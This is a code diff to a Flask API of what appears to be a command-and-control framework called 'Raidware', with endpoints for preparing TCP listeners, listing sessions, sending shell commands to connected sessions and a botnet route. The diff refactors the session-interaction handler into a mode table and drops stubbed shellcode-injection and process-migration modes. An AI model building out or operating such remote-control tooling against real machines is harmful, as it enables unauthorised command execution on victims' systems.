@@ -283,15 +283,13 @@ def prepare_listener():
                 'status': 'error',
                 'msg': '"listener" field is missing'
             }, 400
-
-
+        
         ''' Checking if the listener exists '''
         if not Raidware.check_listener(data.get('listener')):
             return {
                 'status': 'error',
                 'msg': 'Listener does not exist'
             }, 400
-
         ''' Preparing the listener '''
         listener = Raidware.prepare_listener(data.get('listener'))
 
@@ -300,13 +298,14 @@ def prepare_listener():
                 'status': 'error',
                 'msg': 'Failed to prepare listener'
             }, 400
-
+    
+        log(f"Prepared a TCP Listener: {listener}", LogLevel.INFO)
         return listener
 
     except Exception as E:
         return {
             "status" : "error",
-            "msg" : f'Invalid Request. Error: {E}'
+            "msg" : f'Invalid Request. Error: {E.__repr__()}'
         }, 400
 
 @bp.route(f'/update', methods=['PUT'])
@@ -667,10 +666,6 @@ def logout_refresh():
 @bp.route(f'/sessions', methods=['GET'])
 @jwt_required()
 def sessions():
-    name = get_jwt_identity()
-    log(f"Getting sessions for [RED]{name}[RESET]", LogLevel.INFO)
-    log(f"Connections: {connections}")
-
     return {
         'status': 'success',
         'sessions': [connections[i].__dict__() for i in connections.keys()]
@@ -679,8 +674,38 @@ def sessions():
 @bp.route(f'/interact', methods=['POST'])
 @jwt_required()
 def interact():
-    name = get_jwt_identity()
-    log(f"Interacting with session for [RED]{name}[RESET]", LogLevel.INFO)
+    
+    def shell(**kwargs):
+        print(kwargs)
+        ''' Sending the command to the session '''
+        session.send(f'{data["mode"]}:{data["payload"]}')
+        ret = session.recv()
+        
+        if data["payload"][:2].lower() == "cd":
+            session.pwd = ret
+
+        return {
+            'status': 'success',
+            'msg': ret
+        }
+    
+    def upload(**kwargs):
+        return {
+            'status': 'success',
+            'msg': 'File Uploaded Successfully!'
+        }
+    
+    def download(**kwargs):
+        return {
+            'status': 'success',
+            'msg': 'File Downloaded Successfully!'
+        }
+
+    modes = {
+        'shell' : shell,
+        'upload' : upload,
+        'download' : download
+    }
 
     ''' Checking if data has been passed through json '''
     content_type = request.headers.get('Content-Type')
@@ -721,54 +746,14 @@ def interact():
 
     ''' Getting the session '''
     session = connections[data.get('SID')]
-    if data.get('mode') == 'shell':
-        ''' Sending the command to the session '''
-        session.send(f'{data["mode"]}:{data["payload"]}')
-        ret = session.recv()
-        
-        if data["payload"][:2].lower() == "cd":
-            session.pwd = ret
 
-        return {
-            'status': 'success',
-            'msg': ret
-        }
-
-    elif data.get('mode') == 'upload':
-        ''' Uploading the file to the session '''
-        return {
-            'status': 'success',
-            'msg': 'File uploaded successfully'
-        }
-        pass
-    
-    elif data.get('mode') == 'download':
-        ''' Downloading the file from the session '''
-        return {
-            'status': 'success',
-            'msg': 'File downloaded successfully'
-        }
-        pass
-
-    elif data.get('mode') == 'inject':
-        return {
-            'status': 'success',
-            'msg': 'Shellcode injected into session'
-        }
-        pass
-
-    elif data.get('mode') == 'migrate':
-        return {
-            'status': 'success',
-            'msg': 'Migrated to the specified process'
-        }
-        pass
-
-    else:
+    if data.get('mode') not in modes:
         return {
             'status': 'error',
             'msg': 'Invalid mode specified'
         }, 400
+    
+    return modes[data.get('mode')](**data)
 
 @bp.route(f'/botnet', methods=['POST'])
 @jwt_required()
